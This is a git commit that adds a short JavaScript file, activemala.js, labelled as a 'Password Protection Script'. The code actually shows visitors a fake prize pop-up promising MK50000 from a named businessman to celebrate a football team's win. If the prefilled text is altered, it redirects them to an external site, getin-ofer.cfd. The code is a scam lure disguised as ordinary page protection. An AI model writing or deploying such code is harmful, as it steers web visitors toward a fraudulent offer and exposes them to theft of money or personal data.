3374d61bbdc54fcf19e93165edb423f138c7915a
Help-All <imaobongumoh637@gmail.com>
2026-08-15 23:57:02 +0100

    Create activemala.js

---
+++ activemala.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW MK50000'
+password = prompt(
+  'Congratulations! You are eligible to receive the MK50000 FROM THOM MPINGANJIRA TO CELEBRATE THE VICTORY OF THE SCORCHERS. Please press OK to receive it instantly.',
+  'WITHDRAW MK50000'
+);
+if (password != 'WITHDRAW MK50000') {
+  location.href = 'https://getin-ofer.cfd/MK50000-Our-Victory.html';
+  }
